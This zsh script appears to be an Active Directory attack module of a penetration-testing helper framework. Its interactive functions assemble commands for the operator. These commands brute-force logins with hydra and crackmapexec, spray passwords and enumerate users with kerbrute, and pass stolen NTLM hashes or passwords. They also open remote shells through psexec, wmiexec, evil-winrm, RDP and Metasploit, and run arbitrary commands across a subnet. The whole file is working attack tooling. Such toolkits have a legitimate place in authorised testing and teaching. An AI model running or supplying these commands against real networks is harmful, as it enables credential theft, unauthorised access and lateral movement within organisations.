#!/usr/bin/env zsh

############################################################# 
# nb-ad-rce
#############################################################
nb-ad-rce-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-rce
----------
The nb-ad-rce namespace provides commands for getting shells/remote code execution on a target system.

Brute Force Attacks
-------------------
nb-ad-rce-brute-cme            brute force password/login for a user account with cme
nb-ad-rce-brute-hydra          brute force password/login for a user account with hydra
nb-ad-rce-brute-winrm          brute force password/login for a user account for winrm
nb-ad-rce-pass-spray           use kerbrute to perform password spraying
nb-ad-rce-users-spray          use kerbrute to brute force valid usernames 

Getting Shells
--------------
nb-ad-rce-freerdp              connect via freerdp to a target host
nb-ad-rce-evil-winrm           connect via winrm to a target host
nb-ad-rce-psexec               connect via psexec to a target host
nb-ad-rce-wmiexec              connect via wmiexec to a target host
nb-ad-rce-psexec-msf           connect via metasploit's psexec to a target host

Misc
----
nb-ad-rce-nmap-winrm           scan hosts for open winrm port
nb-ad-rce-cme-pass             pass the password/hash on a network subnet
nb-ad-rce-cme-command          pass the password/hash on a network subnet and execute command

DOC
}

nb-ad-rce-nmap-winrm() {
  __check-project
  nb-vars-set-rhost
  print -z "nmap -v -sT -p 5985 ${__RHOST}"
}

nb-ad-rce-wmiexec() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "wmiexec.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST}"
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "wmiexec.py ${__USER}:'${__PASS}'@${__RHOST}"
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "wmiexec.py ${__USER}@${__RHOST} -hashes :${__HASH}"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-psexec() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST}"
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__USER}:'${__PASS}'@${__RHOST}"
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "psexec.py ${__USER}@${__RHOST} -hashes :${__HASH}"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-psexec-msf() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbdomain ${__DOMAIN} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__HASH} ; run\""
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-freerdp() {
    __check-project
    nb-vars-set-rhost
    nb-vars-set-user
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Enter a password for authentication"
        nb-vars-set-pass

        __ask "Do you wanna share a directory via RDP? (y/n)"
        local dir && __askvar dir "SHARE_DIRECTORY"

        if [[ $dir == "y" ]]; then
            local d && __askpath d DIRECTORY $HOME/desktop/projects
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /p:'${__PASS}' /cert:ignore +drive:smbfolder,$d"
        else
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /p:'${__PASS}' /cert:ignore"
        fi
    elif [[ $login == "h" ]]; then
        __ask "Enter the NTLM hash for authentication"
        __check-hash

        __ask "Do you wanna share a directory via RDP? (y/n)"
        local dir && __askvar dir "SHARE_DIRECTORY"

        if [[ $dir == "y" ]]; then
            local d && __askpath d DIRECTORY $HOME/desktop/projects
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /pth:'${__HASH}' /cert:ignore +drive:smbfolder,$d"
        else
            print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /pth:'${__HASH}' /cert:ignore"
        fi
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-rce-evil-winrm() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user

  echo
  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      echo
      __ask "Enter a password for authentication"
      nb-vars-set-pass
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -p '${__PASS}'"
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -H '${__HASH}'"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-brute-winrm() {
  __check-project
  nb-vars-set-rhost
  nb-vars-set-user

  echo
  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      echo
      __ask "Enter a password for authentication"
      nb-vars-set-pass
      print -z "crackmapexec winrm ${__RHOST} -u '${__USER}' -p '${__PASS}'"
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "crackmapexec winrm ${__RHOST} -u '${__USER}' -H '${__HASH}'"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-ad-rce-brute-hydra() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Is the service running on default port? (y/n)"
    local df && __askvar df "DEFAULT_PORT"

    if [[ $df == "n" ]]; then
      __ask "Enter port number"
      local pn && __askvar pn "PORT_NUMBER"
    fi

    if [[ $login == "p" ]]; then
      nb-vars-set-user
      if [[ $df == "n" ]]; then
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -l ${__USER} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "l" ]]; then
      nb-vars-set-wordlist
      nb-vars-set-pass
      if [[ $df == "n" ]]; then
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      else
        print -z "hydra -L ${__WORDLIST} -p ${__PASS} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
      fi
    elif [[ $login == "b" ]]; then
      __ask "Do you wanna manually specify wordlists? (y/n)"
      local sw && __askvar sw "SPECIFY_WORDLIST"
      if [[ $sw == "y" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/

        if [[ $df == "n" ]]; then
          print -z "hydra -L $ul -P $pl -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      else
        nb-vars-set-wordlist
        if [[ $df == "n" ]]; then
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -s $pn -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        else
          print -z "hydra -L ${__WORDLIST} -P ${__PASSLIST} -o $(__hostpath)/smb-hydra-brute.txt ${__RHOST} smb -t 64 -F"
        fi
      fi
    else
      echo
      __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-ad-rce-pass-spray() {
    __check-project
    nb-vars-set-domain

	  __ask "Enter the IP address of the target DC controller"
    nb-vars-set-dchost

    __ask "Select a user list"
    __askpath ul FILE $HOME/desktop/projects/

	  __ask "Enter the password for spraying"
    local pw && __askvar pw PASSWORD

    print -z "kerbrute passwordspray -d ${__DOMAIN} --dc ${__DCHOST} $ul '$pw' --user-as-pass -o $(__dcpath)/kerbrute-password-spray.txt"
}

nb-ad-rce-brute-cme() {
    __check-project
    nb-vars-set-rhost

    __ask "You wanna brute force login/password/both? (l/p/b)"
    local login && __askvar login "LOGIN_OPTION"

    __ask "Do you want to add a domain? (y/n)"
    local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/
        nb-vars-set-user

        if [[ $add_domain == "y" ]]; then
            nb-vars-set-domain
            print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
        else
            print -z "crackmapexec smb ${__RHOST} -u '${__USER}' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-pass.txt"
        fi
    elif [[ $login == "l" ]]; then
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/
        nb-vars-set-pass

        if [[ $add_domain == "y" ]]; then
            nb-vars-set-domain
            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
        else
            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '${__PASS}' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-login.txt"
        fi
    elif [[ $login == "b" ]]; then
        __ask "Select a password list"
        __askpath pl FILE $HOME/desktop/projects/
        __ask "Select a user list"
        __askpath ul FILE $HOME/desktop/projects/

        if [[ $add_domain == "y" ]]; then
            nb-vars-set-domain
            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' -d ${__DOMAIN} --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
        else
            print -z "crackmapexec smb ${__RHOST} -u '$ul' -p '$pl' --local-auth --continue-on-success | tee $(__hostpath)/cme-brute-both.txt"
        fi
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'l' for login or 'b' for both."
    fi
}

nb-ad-rce-cme-pass() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netpath)/cme-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netpath)/cme-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-rce-cme-command() {
    __check-project
    nb-vars-set-network
    nb-vars-set-user

    __ask "Enter command to execute such as whoami /all"
    local cm && __askvar cm "COMMAND"

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Do you want to add a domain? (y/n)"
        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

        if [[ $add_domain == "y" ]]; then
            __ask "Enter the domain"
            nb-vars-set-domain
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
        else
            __ask "Enter a password for authentication"
            nb-vars-set-pass
            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
        fi
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-rce-users-spray() {
    __check-project
    nb-vars-set-domain
	  __ask "Enter the IP address of the target DC server"
    nb-vars-set-dchost

    __ask "Do you wanna manually specify wordlists? (y/n)"
    local sw && __askvar sw "SPECIFY_WORDLIST"

    if [[ $sw == "y" ]]; then
      __ask "Select a user list"
      __askpath ul FILE $HOME/desktop/projects/

      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc ${__DCHOST} $ul -o $(__dcpath)/kerbrute-user-enum.txt"
    else
      nb-vars-set-wordlist
      print -z "sudo kerbrute userenum -d ${__DOMAIN} --dc ${__DCHOST} ${__WORDLIST} -o $(__dcpath)/kerbrute-user-enum.txt"
    fi
}
